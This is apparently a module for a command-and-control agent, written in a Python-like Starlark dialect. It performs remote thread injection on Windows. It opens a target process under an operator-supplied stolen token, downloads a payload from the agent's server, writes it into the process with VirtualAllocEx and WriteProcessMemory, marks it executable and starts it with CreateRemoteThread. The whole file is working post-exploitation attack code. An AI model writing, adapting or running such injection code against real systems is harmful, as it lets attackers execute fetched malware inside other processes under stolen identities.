# Minimal token-aware remote thread injection.
#
# This module does NOT steal or adjust any token itself. It simply runs
# under the token the operator already assigned to this module (the
# universal `--token <SID>` option injected into every module) — the same
# "existing token" that whoami.star inspects via current_token(). Since
# every win_call automatically impersonates the assigned token, OpenProcess
# below already sees the stolen identity; no privilege juggling needed.

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20

PROCESS_CREATE_THREAD = 0x0002
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_QUERY_INFORMATION = 0x0400


def inject_task(process_handle, payload_bytes):
    data_size = len(payload_bytes)
    if data_size == 0:
        return 0, "Payload data size is 0"

    # VirtualAllocEx(processHandle, 0, dataSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    res_alloc = win_call(
        "kernel32.dll",
        "VirtualAllocEx",
        process_handle,
        0,
        data_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )
    remote_addr = res_alloc["r1"]
    if remote_addr == 0:
        return 0, "VirtualAllocEx failed: " + str(res_alloc.get("error"))

    # Copy payload bytes into a local buffer.
    # Note: payload_bytes[i] is a 1-element bytes, not an int — convert
    # with the ord() builtin before passing to write_u8.
    local_buf = win_alloc(data_size)
    for i in range(data_size):
        write_u8(local_buf, i, ord(payload_bytes[i]))

    # WriteProcessMemory(processHandle, remoteAddr, localBuf, dataSize, &written)
    written_ptr = win_alloc(8)
    res_write = win_call(
        "kernel32.dll",
        "WriteProcessMemory",
        process_handle,
        remote_addr,
        local_buf,
        data_size,
        written_ptr,
    )
    win_free(local_buf)
    win_free(written_ptr)

    if res_write["r1"] == 0:
        return 0, "WriteProcessMemory failed: " + str(res_write.get("error"))

    # Flip to RX so the injected image is executable but not writable
    old_prot_ptr = win_alloc(4)
    res_prot = win_call(
        "kernel32.dll",
        "VirtualProtectEx",
        process_handle,
        remote_addr,
        data_size,
        PAGE_EXECUTE_READ,
        old_prot_ptr,
    )
    win_free(old_prot_ptr)
    if res_prot["r1"] == 0:
        return 0, "VirtualProtectEx failed: " + str(res_prot.get("error"))

    # CreateRemoteThread(processHandle, 0, 0, remoteAddr, 0, 0, &threadId)
    thread_id_ptr = win_alloc(4)
    res_thread = win_call(
        "kernel32.dll",
        "CreateRemoteThread",
        process_handle,
        0,
        0,
        remote_addr,
        0,
        0,
        thread_id_ptr,
    )
    thread_handle = res_thread["r1"]
    thread_id = read_u32(thread_id_ptr, 0)
    win_free(thread_id_ptr)

    if thread_handle == 0:
        return 0, "CreateRemoteThread failed: " + str(res_thread.get("error"))

    print(
        "[+] Remote thread created (Handle: 0x%x, Thread ID: %d)"
        % (thread_handle, thread_id)
    )
    return thread_handle, None


def inject_remote(process_id, payload_bytes):
    access = (
        PROCESS_CREATE_THREAD
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION
        | PROCESS_VM_WRITE
        | PROCESS_VM_READ
    )
    # Runs under the operator-selected token: win_call impersonates
    # automatically, so OpenProcess sees the stolen identity.
    proc_res = win_call("kernel32.dll", "OpenProcess", access, 0, process_id)
    process_handle = proc_res["r1"]
    if process_handle == 0:
        return "OpenProcess (PID %d) failed: %s" % (
            process_id,
            str(proc_res.get("error")),
        )

    thread_handle, err = inject_task(process_handle, payload_bytes)
    if thread_handle != 0:
        win_call("kernel32.dll", "CloseHandle", thread_handle)
    win_call("kernel32.dll", "CloseHandle", process_handle)

    return err


def main(*args):
    if len(args) != 3:
        return "Fail: invalid arguments, usage: pid payload_file checksum"
    pid = int(args[0])
    payload_file = args[1]
    checksum = args[2]

    # Use the existing token the operator assigned to this module
    # (universal --token <SID> option). Same lookup as whoami.star:
    # stolen token if set, else thread token, else process token.
    h_token = current_token()
    if h_token == 0:
        return "Fail: cannot open the current token"
    win_call("kernel32.dll", "CloseHandle", h_token)

    payload_bytes = agent.fetch_file(
        file_to_download=payload_file,
        checksum=checksum,
    )
    if not payload_bytes:
        return "Fail: fetch_file failed for " + payload_file

    print(
        "[*] Injecting %d bytes of payload into PID %d with the existing token..."
        % (len(payload_bytes), pid)
    )
    err = inject_remote(pid, payload_bytes)
    if err != None:
        print("[-] Injection failed: %s" % err)
        return "Fail: " + err

    print("[+] Injected successfully into PID %d" % pid)
    return "OK"
